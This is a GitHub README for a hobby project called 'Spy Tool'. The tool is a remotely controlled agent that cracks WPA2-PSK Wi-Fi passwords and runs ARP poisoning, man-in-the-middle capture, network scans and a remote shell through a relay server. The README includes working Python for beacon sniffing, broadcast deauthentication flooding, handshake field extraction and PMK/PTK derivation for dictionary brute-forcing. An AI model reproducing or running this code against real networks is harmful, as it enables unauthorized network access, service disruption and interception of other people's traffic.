# Spy Tool
A network tool for performing simple second layer attacks with a simple gui.

## Table of Contents
- [Introduction](#intro)

  - [How this project came to be](#how)
  - [The spy, HQ and communicator](#the-spy)
  - [What does the tool do](#what)
  
- [Features](#features)
    - [Perform a brute-force attack on a wpa2-psk secured wireless network](#perform)
    - [Connect multiple spies to a single communicator](#connect)
    - [Command a spy to start an arp poisoning attack between any 2 stations](#command-spoof)
    - [Command a spy to start capturing the traffic between any 2 stations](#command-mitm)
    - [Command a spy to scan the local network it's in](#command-scan)
    - [Control a spy's shell from the hq's gui](#control)
    
- [Security And Encryption](#security)
    - [The Authentication Proccess](#auth)
    - [The Data Transfer Protocol](#transfer)

- [Summary](#sum)
    - [Known issues](#issue)

    - [Future Plans](#future)
    
- [Links](#links)

## <a name = "intro"></a>Introduction
### <a name = "how"></a>How this project came to be

When I first started this project, my goal was to make a graphical network tool that would allow it's user to initiate a basic second-layer attack(for example Arp poisoning) over the internet by controlling a “spy” computer in the desired network. When I finished my first version of my project that could do all that I felt like the project didn’t have much use and I decided to expand it by turning it into a tool that can perform an entire attack with a simple gui/ui. I started reading about the wpa/wpa2 protocols and about their vulnerabilities and I decided to implement into my tool an automatic wpa2-psk brute-force attack. 
After writing code that could brute force a wpa2-psk secured network I felt that If I had added only this feature to my project it will not be able to perform a full attack. When I was coding the brute force attack’s code, I came across a Linux tool named tmux and I realized that if I could make my program open a tmux tab and capture the output of it without stopping my main code I could essentially make a synthetic shell and so I added that to my project too.

### <a name = "the-spy"></a>The spy, the HQ and the communicator
The final project consists of 3 parts:
- the spy – which is the program ran on the computer that is connected(or close by) to the desired local network.
- the communicator – which is the server that the spy and HQ connect to and send and receive their information and commands(the communicator is essential because of port forwarding) 
- the HQ – which is the program that the user runs on his pc and controls/monitors the attack.

### <a name = "what"></a>What does the tool do
When the spy is first executed it will ask the user on which interface he would like to operate, if the given interface is not connected to the internet the program will offer him to brute-force the psk of the network that he wants to hack into using a dictionary of his choice. After connecting the spy to the internet, the user will connect to the desired communicator. The user could then launch the hq on his PC, connect to the same communicator and communicate with the spy with an encryption protocol similar to the wpa2-psk protocol, the user will be able to operate a shell on the spy, scan the spy’s network and perform Arp poisoning and mitm attacks with a simple gui.

## <a name = "features"></a>Features
Note: the entire wpa2-psk brute-force attack, the Arp spoofs, the mitm attacks and the scans were written in python with scarce use of external tools.
### <a name = "perform"></a>Perform a brute-force attack on a wpa2-psk secured wireless network

When the spy is given a interface it checks if it’s connected to the internet by sending a ping to a chosen address (defaulted to google.com) and checks if there is a response, after checking the connection, if the spy isn’t connected and the user wants to brute force an access point’s psk the program starts an attack made up of 4 parts:


1 .The spy enters monitor mode using aircrack-ng, starts sniffing for beacons (using scapy) of the given ssid while simultaneously switching channels Until finally, it extracts the bssid of the AP.
** **
The function that handles a sniffed packet (returns True if a sniffed packet is a beacon of the AP):
```python
def packetHandler(self, pkt):
    if pkt.haslayer(Dot11):  # refers to 802.11 protocol
        if pkt.type == 0 and pkt.subtype == 8:#checks if is a beacon
            if pkt.info.decode("utf-8") == self.ssid:  # pkt.info = ssid
                self.bssid = pkt.addr2
                self.apChannel = self.freqToChannel(pkt[RadioTap].Channel)
                self.isWPA2 = Dot11EltRSN in pkt
                return True
        return False
```
2 . The spy creates a thread sending de-auth frames to the stations connected to the AP and simultaneously sniffs  for a 4 way hand-shake made with the AP.

```python
def deAuthThread(self):
    timer = Timer(self.sniffTimeOut)
    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid, addr3=self.bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    timer.start()
    while not timer.isOver() and (self.handshake == None or self.handshake.isValid == False):
        try:
            sendp(packet, inter=0.1, iface=self.interface, verbose=False)#sends de-auth packet
        except Exception as e:
            print(e)

```
3 .After the four way handshake was captured the spy extracts the anonce, snonce, mic and macs of the station and the AP(although it already knows the ap’s mac - bssid)

```python
def getNonce(self, pkt):
    return pkt[Raw].load[13:45]

def getMic(self, pkt):
    return binascii.hexlify(pkt[Raw].load)[154:186]

```


5 . Finally the spy starts going over a dictionary and for each psk it does the following – turns the psk into a pmk using the pbkdf2 function and the ssid as salt,  turns the pmk into the ptk , generates the mic from the snonce and compares the generated mic to the sniffed mic.

```python 
def calcPMK(self, PSK):
    PMK = hashlib.pbkdf2_hmac('sha1', PSK.encode('ascii'), self.ssid.encode('ascii'), 4096, 32)
    return PMK
```


```python
def calcPTK(self, PMK, data):
    blen = 64
    i = 0
    R = b""
    pke = b"Pairwise key expansion"
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(PMK, pke + chr(0x00).encode() + data + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()

    return R[:blen]
```

When I ran this attack on my laptop it went over about `300` passwords a second.

### <a name = "connect"></a>Connect multiple spies to a single communicator 
A single communicator can handle multiple spies conecting to it and allow a HQ to link to them seemlessly.
![ezgif-3-85636aff16](https://user-images.githubusercontent.com/53350057/163164751-6544daea-d6c9-4a59-b15b-89aa76e30fa3.gif)

### <a name = "command-spoof"></a>Command a spy to start an arp poisoning attack between any 2 stations
After connecting to the internet the spy opens a thread for arp poisoning that is given a set of `station links`  to spoof and sends fake arp answers for each link (with a default interval of 1 second between every fake arp answer).
When a HQ is controlling a spy he can send commands to the spy to add or remove a station link from the arp poisoning thread.

![ezgif-3-09379ba2af](https://user-images.githubusercontent.com/53350057/163182114-7a4d3c1b-ca07-4369-a502-65493b27aed5.gif)


The green line between 2 stations indicates that the spy is performing a arp spoof attack on them.

Note: by writing 'performing a arp spoof attack on them' I mean that the spy is convincing each station that the spy's mac is the other station's mac, so the spy is basically forcing their traffic to go through 
itself.

### <a name = "command-mitm"></a>Command a spy to start capturing the traffic between any 2 stations
Simmilar to the arp posoning thread, after connecting to the internet the spy opens a thread for capturing traffic between 2 stations - that is given a set of `station links` aswell.
When a HQ is controlling a spy he can send commands to the spy to add or remove a station link from the mitm thread.

![ezgif-3-e62de6df3c](https://user-images.githubusercontent.com/53350057/163183520-193b7eb3-56a9-4bd3-9b05-58204dfece09.gif)

The red line between 2 stations indicates that the spy is capturing the traffic between them.

### <a name = "command-scan"></a>Command a spy to scan the local network it's in
The spy has a scanner object that can perform a quick arp scan on it's local network. When a HQ is controlling a spy it has a scan button that can tell the spy to perform a new scan.

![ezgif-3-8d6799b0a9](https://user-images.githubusercontent.com/53350057/163190091-cbed68f3-72c7-4a7d-bfae-3514bced922e.gif)

### <a name = "control"></a>Control a spy's shell from the hq's gui

As i've explained in the *[introduction](#intro)* i used tmux and script to open a controlable 'shell' on the spy. When the HQ is linked to a spy the spy sends him the tmux shell's output and the HQ starts printing it in the python terminal, in addition the HQ can write in the terminal commands that when he presses enter are sent to the spy which then executes them in the tmux window.

![ezgif-3-024c12139b](https://user-images.githubusercontent.com/53350057/163196027-1c7ee20b-2a6d-431f-8766-b65d38ba2f63.gif)

## <a name = "security"></a>Security and Ecryption

The data sent between a spy an HQ and a communicator is encrypted using a protocol simmilar to the wpa2-psk protocol.

### <a name = "auth"></a>The Authentication Proccess
When a spy or an HQ wants to conect to a communicator they send the communicator their name(which is entered by the user). After the communicator receives the name he generates their key from the password of the communicator using the pbkdf2 function with 100000 iterations and the name as salt, he then sends a random  32-bit  integer to the hq/spy. On the other side the hq/spy receives the number, generates the key using the password that the user enters and sends back the same number but encrypted using their key. The communicator then checks if the encrypted number that he received is legit by decrypting it and if it is - they start to communicate using that key.


The function that the key is generated with:
```python
def genKey(self, passPhrase, salt):
    passPhrase = passPhrase.encode()
    salt = salt.encode()
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
    key = base64.urlsafe_b64encode(kdf.derive(passPhrase))
    return key


```
### <a name = "transfer"></a>The data transfer protocol
In order to transfer data between spies, hqs and communicators I've written a simple protocol that tells each part of the project how to send and receive data using string constants.

Here are some of the constants i've declared and also an example of a message:

```python
self.START = "STR"
self.END = "END"
self.RAW = "RAW"
self.SECTION = "SCT"
self.DIVIDER = "#"
self.LINK = "~"
self.SCAN = "SCN"
self.SPOOFED = "SPF"
self.MITM = "MTM"
```
```
STRSCN#192.168.0.1~ec:08:6b:c4:1e:86#192.168.0.105~40:8d:5c:70:a5:0f#192.168.0.109~74:da:38:1d:ef:e2#192.168.0.110~30:b5:c2:83:e3:f7#192.168.0.107~c8:28:32:2d:72:03#192.168.0.113~b4:2e:99:97:37:aeSCTSPFSCTMTMRAWEND
```
## <a name = "sum"></a>Summary
After playing around for a couple of weeks with the wpa2-psk protocol and some second layer vulnerabilities i've come to an understating that wpa/wpa2-psk protected networks can be very insecure (especially if they use weak passwords) and that i should probably use a vpn.
### <a name = "issue"></a>Known issues
1. After disconnecting from a communicator the hq fails to reconnect to it’s spies.
2. Due to frequent de-auth frames being sent the spy accidently disconnects stations from aps while they are authenticating which sometimes causes the handshake that is captured to be made up of 2 different sessions which eventually ruins the hole attack(not sure if this is correct but if it is it'll be quite easy to fix).
3. Sometimes the spy is disconnected from the communicator without getting notified.
4. Sometimes the spy scans the same station twice as if it's 2 stations.
5. In rare occasions the spy may not enter monitor mode properly when trying to sniff but im pretty sure this is a problem with aircrack-ng and not my code.


### <a name = "future"></a>Future plans
1.	Add a function that will distinguish between wired and wireless interfaces.
2.	Add a function that detects the os type and version.
3.	Add an organized ui class to the spy.
4.	Add a data collection class.
5.	Replace the synthetic shell with an actual ssh tunnel.
6.	Rewrite the networking.
7.	Enable more dynamic Arp spoofs.
8.	Allow the user to choose a subnet mask.
9.	Improve gui.
10. Use inheritence and other OOP ideas more often in my code. 


## <a name = "links"></a>Links
[Youtube Video](https://www.youtube.com/watch?v=w2E27dGDpD4)

[Spy Drawio Plannings(Old)1](https://drive.google.com/file/d/1oEchmTxtnlKGkk_lMfPOOp1bDhPhMUl3/view?usp=sharing)
[Spy Drawio Plannnigs(Old)2](https://drive.google.com/file/d/1vN4r7Zd1qcYQUaUZPZKUfmeC_NPpnezw/view?usp=sharing)

[Linkedin](https://www.linkedin.com/in/eyal-angel-480220227)
